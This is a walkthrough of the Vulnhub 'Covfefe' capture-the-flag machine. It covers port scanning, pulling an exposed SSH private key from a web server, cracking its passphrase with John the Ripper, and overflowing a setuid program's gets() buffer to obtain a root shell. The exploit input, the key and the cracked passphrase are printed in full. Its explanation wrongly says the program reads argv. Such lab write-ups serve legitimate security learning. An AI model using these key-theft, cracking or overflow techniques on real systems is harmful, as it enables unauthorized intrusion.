# covfefe-ctf
Covfefe CTF from Vulnhub - walkthrough

Covfefe CTF

192.168.1.109   08:00:27:aa:cc:43      3     180  PCS Systemtechnik GmbH

nmap -sC -sV -T5 -v -n -p- --open --script *vuln* 192.168.1.109

`PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10 (protocol 2.0)
80/tcp    open  http    nginx 1.10.3
|_http-server-header: nginx/1.10.3
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  CVE:CVE-2011-3192  OSVDB:74721
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       http://seclists.org/fulldisclosure/2011/Aug/175
|       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|       http://nessus.org/plugins/index.php?view=single&id=55976
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|_      http://osvdb.org/74721
31337/tcp open  http    Werkzeug httpd 0.11.15 (Python 3.5.3)
MAC Address: 08:00:27:AA:CC:43 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`


root@kali:~# curl http://192.168.1.109/robots.txt
`<html>
<head><title>404 Not Found</title></head>
<body bgcolor="white">
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.10.3</center>
</body>
</html>`


root@kali:~# curl http://192.168.1.109:31337/robots.txt
`User-agent: *
Disallow: /.bashrc
Disallow: /.profile
Disallow: /taxes`

curl http://192.168.1.109:31337/.bashrc
`	# ~/.bashrc: executed by bash(1) for non-login shells.
	# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
	# for examples

	# If not running interactively, don't do anything
	case $- in
		*i*) ;;
		  *) return;;
	esac

	# don't put duplicate lines or lines starting with space in the history.
	# See bash(1) for more options
	HISTCONTROL=ignoreboth

	# append to the history file, don't overwrite it
	shopt -s histappend

	# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
	HISTSIZE=1000
	HISTFILESIZE=2000

	# check the window size after each command and, if necessary,
	# update the values of LINES and COLUMNS.
	shopt -s checkwinsize

	# If set, the pattern "**" used in a pathname expansion context will
	# match all files and zero or more directories and subdirectories.
	#shopt -s globstar

	# make less more friendly for non-text input files, see lesspipe(1)
	#[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

	# set variable identifying the chroot you work in (used in the prompt below)
	if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
		debian_chroot=$(cat /etc/debian_chroot)
	fi

	# set a fancy prompt (non-color, unless we know we "want" color)
	case "$TERM" in
		xterm-color|*-256color) color_prompt=yes;;
	esac

	# uncomment for a colored prompt, if the terminal has the capability; turned
	# off by default to not distract the user: the focus in a terminal window
	# should be on the output of commands, not on the prompt
	#force_color_prompt=yes

	if [ -n "$force_color_prompt" ]; then
		if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
		    # We have color support; assume it's compliant with Ecma-48
		    # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
		    # a case would tend to support setf rather than setaf.)
		    color_prompt=yes
		else
		    color_prompt=
		fi
	fi

	if [ "$color_prompt" = yes ]; then
		PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
	else
		PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
	fi
	unset color_prompt force_color_prompt

	# If this is an xterm set the title to user@host:dir
	case "$TERM" in
	xterm*|rxvt*)
		PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
		;;
	*)
		;;
	esac

	# enable color support of ls and also add handy aliases
	if [ -x /usr/bin/dircolors ]; then
		test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
		alias ls='ls --color=auto'
		#alias dir='dir --color=auto'
		#alias vdir='vdir --color=auto'

		#alias grep='grep --color=auto'
		#alias fgrep='fgrep --color=auto'
		#alias egrep='egrep --color=auto'
	fi

	# colored GCC warnings and errors
	#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

	# some more ls aliases
	#alias ll='ls -l'
	#alias la='ls -A'
	#alias l='ls -CF'

	# Alias definitions.
	# You may want to put all your additions into a separate file like
	# ~/.bash_aliases, instead of adding them here directly.
	# See /usr/share/doc/bash-doc/examples in the bash-doc package.

	if [ -f ~/.bash_aliases ]; then
		. ~/.bash_aliases
	fi

	# enable programmable completion features (you don't need to enable
	# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
	# sources /etc/bash.bashrc).
	if ! shopt -oq posix; then
	  if [ -f /usr/share/bash-completion/bash_completion ]; then
		. /usr/share/bash-completion/bash_completion
	  elif [ -f /etc/bash_completion ]; then
		. /etc/bash_completion
	  fi
	fi`


root@kali:~# curl http://192.168.1.109:31337/.profile
`	# ~/.profile: executed by the command interpreter for login shells.
	# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
	# exists.
	# see /usr/share/doc/bash/examples/startup-files for examples.
	# the files are located in the bash-doc package.

	# the default umask is set in /etc/profile; for setting the umask
	# for ssh logins, install and configure the libpam-umask package.
	#umask 022

	# if running bash
	if [ -n "$BASH_VERSION" ]; then
		# include .bashrc if it exists
		if [ -f "$HOME/.bashrc" ]; then
		    . "$HOME/.bashrc"
		fi
	fi

	# set PATH so it includes user's private bin if it exists
	if [ -d "$HOME/bin" ] ; then
		PATH="$HOME/bin:$PATH"
	fi`


curl http://192.168.1.109:31337/taxes/
`	Good job! Here is a flag: flag1{make_america_great_again}`

root@kali:~# curl http://192.168.1.109:31337/.bash_history
`	read_message 
	exit`

curl http://192.168.1.109:31337/.ssh/id_rsa.pub
`	ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDzG6cWl499ZGW0PV+tRaOLguT8+lso8zbSLCzgiBYkX/xnoZx0fneSfi93gdh4ynVjs2sgZ2HaRWA05EGR7e3IetSP53NTxk5QrLHEGZQFLId3QMMi74ebGBpPkKg/QzwRxCrKgqL1b2+EYz68Y9InRAZoq8wYTLdoUVa2wOiJv0PfrlQ4e9nh29J7yPgXmVAsy5ZvmpBp5FL76y1lUblGUuftCfddh2IahevizLlVipuSQGFqRZOdA5xnxbsNO4QbFUhjIlA5RrAs814LuA9t2CiAzHXxjsVW8/R/eD8K22TO7XEQscQjaSl/R4Cr1kNtUwCljpmpjt/Q4DJmExOR simon@covfefe`

curl http://192.168.1.109:31337/.ssh/id_rsa
`	-----BEGIN RSA PRIVATE KEY-----
	Proc-Type: 4,ENCRYPTED
	DEK-Info: AES-128-CBC,BD8515E8D3A10829A4D710D5AFAC64AB

	FCY9ADNWL6702rP3vBGwzSSNXMojtui0v94aefo2O0Wz0n75YcOAKuj1eNA6hnG5
	qGAaJKI7exONZ3GGf+6JZjORn9yTrj6Cc/tZr6dw9BQFHCQcBPBPpWBZO2IGVsvJ
	Mf5H50v4QvL9RJl0Zcn0wGKgcuK4m0SyWD1ZKTQ3O2peRCmHIc39cyGOFMSRqhVU
	7iMryuPbNZdOuzK8F0mCKKdvOwLhfdEQh2GOKJJ8CAI+Pb/NEvIDkDlsh2t148/D
	kExxOmmVS/NTP9ixyOXc7NL34GHP/mfw/OLVUBVGubEkWA/KdNXkYPWcv+RskwMU
	Dz5JVSduyVMdlskKL1h11UETb+WDPGKktO+dYYnCupi4NGROuOcpj57B5gLOdmxy
	uH7gqTltd6uzASFEXS7rKDniG5Fu8C6zab0bCbM0DDzAexAgPQpweJqvSfqpQpKP
	vmAeXnYGu7tw+U5d6CypS0qhS2P07lyboANstYOBrSzFIZF7LuotgPBSGtfTIkYb
	lH8dyk7VEjIZ51exC4ACdJ/Hqhe08m++2f729m/UL/McEGGiZ4r2df5lPIEq8X4b
	Wdu0SYRIi0J0PoGRrUFJ85j8C+yQXV5CIMAC3LUeDlTUcTEZvhbV8E+tB/zDNEUK
	WuH2+4dlUEA4kyiMsoZNUcgIzhbuF7FK+lDxybjsscRG6fDFECmphiqD+jel2C+b
	QK4dOF23OoYwIbx/XFEa7VNRTnkzANQBi4ELGFsc4uZs9conJfb9T3EXrRJjX9jK
	0abmJthTd3wbiZa10nGwhEzXUCVPvh1j+tbn6xHldsqEc4RjZLnXmalBJ6DxgTxn
	24Ozy1+y0CsycEUHG7b3jTUMvlNs0VCAB7YJUZYHdlPwjMeAOklSeI0MgsmeMOXr
	S+LZzoBq0gzmm5Va1hnjFRgBnDgEMNe1KVU+QZy1O2J0yJT/VaKeME80uOP3z/Q3
	kUGmzgGM2gCrXDwbAKfQzUp8pUR0fZT0pGrgsprpWItCvUfymb8MzdmVD6qzCfYC
	tskyUU6wpQrEH7rA244azObC/HlFulYFAQmNdilguTNpou4TMTXNFfHAuq3DZL67
	RJks2xiJKK3XUbXuFP0QIpfHnDnjJIlCKBVDxcUWLCpARWI8OsY4qEY/DlDu3aU3
	b3K/+LdyndDfbb7edi4OJob7A0bSdlFfOhSRlmyeSgFe5oFTvIAevL0ph3nhgik7
	DELkQnFE/xc49nPtchYZDJ6ifExb5WTO8XHCZb+bjf1BX3kAKSTfRZeowbc+gfAD
	ZxGvHc9T8B30hujl04UCPMXlVR/X5/m9I0hnZKIuRDsJH1waZ+CJj6I93T5GKUKT
	kMyZLUf+pmzRbLwdyNuUe+QTTano8SyK9rMLlthoXxCUFeoF3Q1bNOV8CWbXCLgl
	2s4BObMEU9B4fzSMHUa9LpXz8LQvv74L0mnDJ3Jk82+gQuk6P4haTd03MI9ecZ8U
	B0u8R3H9rzAYYr31q2YbZo03enMkRFC9DaEz4P3hMGCuGErQ8tuX3I07hOZGtm8B
	TJAwpCifrLpx1myEg4kz4OhvWk5cL9qV8SP48T0aBoXHtUZFHa6KBNUpoV8QMhyI
	-----END RSA PRIVATE KEY-----`

Save the above private key as simon.rsa and chmod 0600.
	
`	ssh -i simon.rsa simon@192.168.1.109`

We tried ssh'ing into the system with the private key, but still get prompted for a password. We don't know the password yet, 
lets see if it's easily guessed. 

ssh2john simon.rsa > simon.hash
`	root@kali:~/HDD2/ctf/covfefe# john --fork=45 simon.hash 
	john --show simon.hash 
	simon.rsa:starwars

	1 password hash cracked, 0 left`

ssh -i simon.rsa simon@192.168.1.109 
`	Enter passphrase for key 'simon.rsa': 
	Linux covfefe 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u2 (2017-06-26) i686

	The programs included with the Debian GNU/Linux system are free software;
	the exact distribution terms for each program are described in the
	individual files in /usr/share/doc/*/copyright.

	Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
	permitted by applicable law.
	simon@covfefe:~$ `

pwd
`	/home/simon`
simon@covfefe:~$ cat http_server.py 
`	#!/usr/bin/env python3

	from flask import Flask
	from os import environ, listdir

	root = environ['HOME']
	sauce = '/.ssh'

	app = Flask(__name__, static_folder=root, static_url_path='')

	@app.route(sauce)
	def sauce_content():
		return str(listdir(root + sauce)), 200

	@app.route('/taxes/')
	def taxes_content():
		return 'Good job! Here is a flag: flag1{make_america_great_again}'

	if __name__ == '__main__':
		app.run(host='0.0.0.0', port=31337)`


simon@covfefe:~$ cat /etc/passwd
`	root:x:0:0:root:/root:/bin/bash
	daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
	bin:x:2:2:bin:/bin:/usr/sbin/nologin
	sys:x:3:3:sys:/dev:/usr/sbin/nologin
	sync:x:4:65534:sync:/bin:/bin/sync
	games:x:5:60:games:/usr/games:/usr/sbin/nologin
	man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
	lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
	mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
	news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
	uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
	proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
	www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
	backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
	list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
	irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
	gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
	nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
	systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
	systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
	systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
	systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
	_apt:x:104:65534::/nonexistent:/bin/false
	simon:x:1000:1000:,,,:/home/simon:/bin/bash
	messagebus:x:105:109::/var/run/dbus:/bin/false
	sshd:x:106:65534::/run/sshd:/usr/sbin/nologin`

simon@covfefe:~$ cat .bash_history 
`	read_message 
	exit`
	
simon@covfefe:~$ read_message
`	What is your name?
	Simon
	Hello Simon! Here is your message:

	Hi Simon, I hope you like our private messaging system.

	I'm really happy with how it worked out!

	If you're interested in how it works, I've left a copy of the source code in my home directory.

	- Charlie Root`




	
simon@covfefe:uname -a; cat /etc/*ele* /etc/issue
`	Linux covfefe 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u2 (2017-06-26) i686 GNU/Linux
	PRETTY_NAME="Debian GNU/Linux 9 (stretch)"
	NAME="Debian GNU/Linux"
	VERSION_ID="9"
	VERSION="9 (stretch)"
	ID=debian
	HOME_URL="https://www.debian.org/"
	SUPPORT_URL="https://www.debian.org/support"
	BUG_REPORT_URL="https://bugs.debian.org/"
	Welcome to the Covfefe B2R challenge!

	The goal is to obtain a root shell, but you will find flags along the way also.
	You can use any method you want as long as it is done remotely.
	All the tools and wordlists required come with Kali Linux.

	Author: @__timk

	Debian GNU/Linux 9 \n \l`

Apparently we can access /root and read one of the files

simon@covfefe:/home$ cd /root
simon@covfefe:/root$ ls -lashR
`.:
total 24K
4.0K drwxr-xr-x  2 root root 4.0K Jul  9 20:24 .
4.0K drwxr-xr-x 21 root root 4.0K Jun 28  2017 ..
4.0K -rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
4.0K -rw-------  1 root root   75 Jul  9 20:24 flag.txt
4.0K -rw-r--r--  1 root root  148 Aug 18  2015 .profile
4.0K -rw-r--r--  1 root root  767 Jul  9 20:24 read_message.c`


simon@covfefe:/root$ cat read_message.c 
`	#include <stdio.h>
	#include <stdlib.h>
	#include <unistd.h>

	// You're getting close! Here's another flag:
	// flag2{use_the_source_luke}

	int main(int argc, char *argv[]) {
		char program[] = "/usr/local/sbin/message";
		char buf[20];
		char authorized[] = "Simon";

		printf("What is your name?\n");
		gets(buf);

		// Only compare first five chars to save precious cycles:
		if (!strncmp(authorized, buf, 5)) {
		    printf("Hello %s! Here is your message:\n\n", buf);
		    // This is safe as the user can't mess with the binary location:
		    execve(program, NULL, NULL);
		} else {
		    printf("Sorry %s, you're not %s! The Internet Police have been informed of this violation.\n", buf, authorized);
		    exit(EXIT_FAILURE);
		}

	}`


In the above source code we see that it looks for an arguemnt of *argv[] with no sanitation and a total max length of 20. When it receives what it exepcts, it then runs /usr/local/sbin/message taking your argumnt as a variable, which in this case, it wants "Simon" as that variable. Running this program directly, we can see we don't have permission, but root users does have permission to do so.

stat /usr/local/bin/read_message
`  File: /usr/local/bin/read_message
  Size: 7608            Blocks: 16         IO Block: 4096   regular file
Device: 801h/2049d      Inode: 275776      Links: 1
Access: (4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: (   50/   staff)
Access: 2018-01-04 04:54:22.028789044 +1000
Modify: 2017-07-02 18:22:58.919945208 +1000
Change: 2017-07-02 18:22:58.919945208 +1000
 Birth: -`

read_message is a system file run as root (4755), and can be run by anyone.

/usr/local/sbin/message
`-bash: /usr/local/sbin/message: Permission denied`
simon@covfefe:/root$ stat /usr/local/sbin/message
`  File: /usr/local/sbin/message
  Size: 7416            Blocks: 16         IO Block: 4096   regular file
Device: 801h/2049d      Inode: 275777      Links: 1
Access: (0700/-rwx------)  Uid: (    0/    root)   Gid: (   50/   staff)
Access: 2018-01-04 04:54:23.387813690 +1000
Modify: 2017-06-28 22:21:53.991264415 +1000
Change: 2017-06-28 22:23:09.235857470 +1000
 Birth: -
simon@covfefe:/root$ `

"message" can only be run by root, and members of the staff group or when called by "read_message"

When supplied with the argument "Simon" in the char authorized[] = "Simon"; section, if it matches what it expects, it then runs /usr/local/sbin/message, but what happens if we add more than 20 characters to this to overfill the buf[20]; section, followed by a system command? It's then executed in the context of the root user.

	`simon@covfefe:/root$ read_message 
	What is your name?
	Simon123456789012345/bin/sh
	Hello Simon123456789012345/bin/sh! Here is your message:
	#`

We get dropped into a new shell prompt.

	`# id
	uid=1000(simon) gid=1000(simon) euid=0(root) groups=1000(simon),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)`

w00t! We are now simon, but with root capabilities! euid=0(root)

	`cat flag.txt

	You did it! Congratulations, here's the final flag:
	flag3{das_bof_meister}`



